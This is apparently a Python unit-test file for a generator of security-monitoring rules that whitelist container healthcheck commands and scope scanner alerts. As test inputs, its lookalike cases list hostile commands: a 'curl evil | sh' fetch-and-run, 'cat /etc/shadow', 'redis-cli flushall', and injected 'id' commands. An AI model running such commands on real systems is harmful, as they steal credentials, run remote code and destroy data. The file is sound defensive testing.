import json
import os
import re
import unittest
import xml.etree.ElementTree as ET

import gen_local_rules as g


def rx(command):
    return re.compile(g.pattern(command).replace(r"\z", r"\Z"), re.S)   # python spells PCRE's \z as \Z


class HealthcheckRules(unittest.TestCase):
    def test_file_is_current(self):
        self.assertEqual(open(os.path.join(g.HERE, "local_rules.xml")).read(), g.render())

    def test_xml_valid_and_ids_unique(self):
        root = ET.fromstring("<r>" + g.render().replace("<!-- Local rules -->", "") + "</r>")
        ids = [r.get("id") for r in root.iter("rule")]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertIn("100001", ids)
        self.assertTrue(all(r.get("level") == "0" for r in root.iter("rule") if g.FIRST_ID <= int(r.get("id")) < g.SCANNER_RULES[0][0]))

    def test_every_entry_matches_itself_only_exactly(self):
        for e in g.load():
            cmd = e["command"].replace("<REDISPW>", "s3cret")
            self.assertTrue(rx(e["command"]).match("exec_start: " + cmd), e["container"])

    def test_lookalikes_still_alert(self):
        hc = "/bin/sh -c /usr/bin/healthcheck.sh"
        for evil in [
            "exec_start: " + hc + "; curl evil | sh",            # suffix
            "exec_start: " + hc + "\nid",                         # newline-appended command
            "exec_start: sh -c 'x # " + hc + "'",                 # contains it
            "exec_start: /bin/bash",                              # interactive shell
            "exec_start: cat /etc/shadow",
            "exec_start: redis-cli -a pw ping; id",
            "exec_start: redis-cli -a pw flushall",
            "exec_start: pg_isready -U x; id",
        ]:
            self.assertFalse(any(rx(e["command"]).match(evil) for e in g.load()), evil)

    def test_scanner_rules_are_scoped_and_lowered(self):
        root = ET.fromstring("<r>" + g.render().replace("<!-- Local rules -->", "") + "</r>")
        rules = {r.get("id"): r for r in root.iter("rule")}
        for rid, parent, _ in g.SCANNER_RULES:
            r = rules[str(rid)]
            self.assertEqual(r.get("level"), "3")                        # lowered, never 0
            self.assertEqual(r.find("srcip").text, g.SCANNER_IP)         # one address only
            self.assertEqual(r.find("if_sid").text, str(parent))

    def test_lxc_pattern_matches_real_names_only(self):
        rx = re.compile(g.LXC_DEV_PATTERN.replace(r"\z", r"\Z"))
        msg = "File '{}' present on /dev. Possible hidden file."
        for good in ["/dev/.lxc-boot-id", "/dev/.lxc/proc/keys", "/dev/.lxc/proc/key-users", "/dev/.lxc/proc/latency_stats"]:
            self.assertTrue(rx.match(msg.format(good)), good)
        for bad in ["/dev/.evil", "/dev/.lxcx/proc/keys", "/dev/.lxc/proc/keys/../../.evil", "/dev/.lxc/sys/x", "/dev/.lxc/proc/"]:
            self.assertFalse(rx.match(msg.format(bad)), bad)
        self.assertFalse(rx.match(msg.format("/dev/.lxc-boot-id") + " extra"))

    def test_hap_pattern_is_scanner_ssh_only(self):
        rx = re.compile(g.HAP_PATTERN.replace(r"\z", r"\Z"))
        line = "login failure for user karaf from {} via {}"   # what the rule sees after the pre-decoder
        self.assertTrue(rx.search(line.format("192.168.70.11", "ssh")))
        self.assertFalse(rx.search(line.format("203.0.113.5", "ssh")))
        self.assertFalse(rx.search(line.format("1192.168.70.11", "ssh")))
        self.assertFalse(rx.search(line.format("192.168.70.11", "winbox")))
        self.assertFalse(rx.search(line.format("192.168.70.111", "ssh")))

    def test_no_xml_special_chars_in_patterns(self):
        for line in open(os.path.join(g.HERE, "local_rules.xml")):
            if 'type="pcre2"' in line:
                self.assertNotIn("&", line.split(">", 1)[1].rsplit("</field", 1)[0])

    def test_redis_password_not_in_repo(self):
        self.assertNotIn("sRtj", open(os.path.join(g.HERE, "local_rules.xml")).read())
        self.assertNotIn("sRtj", open(os.path.join(g.HERE, "docker_healthchecks.json")).read())


if __name__ == "__main__":
    unittest.main()
